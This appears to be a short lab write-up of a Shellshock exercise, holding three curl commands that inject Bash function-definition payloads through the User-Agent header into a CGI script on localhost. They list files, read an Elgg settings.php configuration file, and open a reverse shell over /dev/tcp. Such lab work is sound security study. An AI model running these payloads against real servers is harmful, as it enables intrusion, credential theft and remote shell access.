## task3
```shell
$ curl -v -A "() { echo hello;}; \
		echo Content_type: text/plain; echo; /bin/ls -l" localhost/cgi-bin/myprog.cgi
```

## task4
```shell
$ curl -A "() { echo hello;}; echo Content_type: text/plain; echo; \
		/bin/cat /var/www/CSRF/Elgg/elgg-config/settings.php " localhost/cgi-bin/myprog.cgi
```

## task5
```shell
$ curl -A "() { echo hello; }; \
		 echo Content_type: text/plain; echo; echo; \
		 /bin/bash -i > /dev/tcp/127.0.0.1/9090 0<&1 2>&1" localhost/cgi-bin/myprog.cgi
```
